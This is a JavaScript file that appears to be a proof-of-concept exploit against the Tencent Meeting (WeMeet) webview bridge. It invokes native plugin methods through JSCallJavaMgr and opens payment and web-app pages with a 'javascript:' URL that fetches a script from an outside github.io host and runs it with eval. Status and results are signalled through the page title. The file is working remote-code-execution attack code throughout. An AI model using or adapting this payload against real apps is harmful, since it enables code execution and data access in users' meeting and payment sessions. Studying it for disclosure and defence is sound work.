(function(){
  document.title='P81TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module:'CommonPlugin',method:'PrintLog',
        param:{log:JSON.stringify(r)},callId:'LOG'
      }));
    }catch(e){}
    document.title='P81CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var jsurl='javascript:void(fetch("https://gitwhs.github.io/wm-poc-rce/p81main.js").then(function(r){return r.text()}).then(eval))';
  var payMain='wemeet://page/pay/main_process_webview';
  var payWeb='wemeet://page/pay/webview';
  var webApp='wemeet://page/web_app';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['T0','CommonPlugin','GetWebPageRunningContext',{}],
    ['T1','CommonPlugin','LoadTemplateWebView',{url:official,template_url:official,template_id:'p81'}],
    ['T2','CommonPlugin','GetWebDownloadShareRoot',{}],
    ['O1','CommonPlugin','OpenNewPage',{scheme:payMain,router_params:{url:official,from_webView:true}}],
    ['O2','CommonPlugin','OpenNewPage',{scheme:payWeb,router_params:{url:official,from_webView:true}}],
    ['O3','CommonPlugin','OpenNewPage',{scheme:payWeb,router_params:{url:jsurl,from_webView:true}}],
    ['O4','CommonPlugin','OpenNewPage',{scheme:webApp,router_params:{url:jsurl,from_webView:true}}],
    ['O5','CommonPlugin','OpenNewPage',{scheme:payMain,nav_scheme:payMain,action_flag:32,router_params:{url:jsurl,from_webView:true}}],
    ['H3','CommonPlugin','GetPerformance',{}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P81TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P81-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n,4000);
  }
  setTimeout(n, 1500);
})();
